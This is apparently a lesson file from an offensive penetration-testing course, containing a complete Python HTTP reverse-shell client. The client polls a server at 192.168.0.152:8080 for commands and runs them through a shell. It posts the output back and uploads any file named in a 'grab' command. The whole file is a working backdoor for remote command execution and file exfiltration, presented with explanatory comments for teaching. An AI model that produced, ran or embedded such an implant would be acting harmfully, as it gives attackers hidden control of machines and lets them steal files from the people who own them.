# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import requests
import os
import subprocess
import time

while True:

    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break


# Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
# notify our attacker that we are unable to find the file, but if the file is there then we will :-
# 1.Append /store in the URL
# 2.Add a dictionary key called 'file'
# 3.requests library use POST method called "multipart/form-data" when submitting files

#All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output. Please see the server script for more details on how we can use these points to get the file


    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path): # check if the file is there
            url = "http://192.168.0.152:8080/store" # Appended /store in the URL
            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)

